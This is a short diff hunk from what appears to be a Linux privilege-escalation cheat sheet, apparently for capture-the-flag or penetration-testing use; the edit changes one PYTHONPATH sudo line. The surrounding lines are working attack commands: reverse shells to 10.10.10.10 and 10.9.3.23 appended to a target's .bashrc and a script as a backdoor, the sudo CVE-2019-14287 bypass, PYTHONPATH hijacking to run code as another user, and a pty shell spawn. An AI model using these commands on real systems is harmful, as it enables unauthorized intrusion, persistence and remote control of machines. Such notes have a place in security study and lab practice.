@@ -32,7 +32,7 @@ echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' >> ~/.bashrc # backdoor in targ
 -----------------
 sudo -u#-1 /bin/bash # CVE-2019-14287
 sudo -u silvio /usr/bin/zip # run with another user
-sudo -u jordan PYTHONPATH=$PYTHONPATH/tmp/ /opt/scripts/flag.py # run with PYTHONPATH 
+sudo -u jordan PYTHONPATH=/tmp /opt/scripts/flag.py # run with PYTHONPATH 
 
 echo 'import pty;pty.spawn("/bin/bash")' >> /tmp/shop.py
 echo "bash -i >& /dev/tcp/10.9.3.23/4444 0>&1" >> /opt/scripts/flag.sh
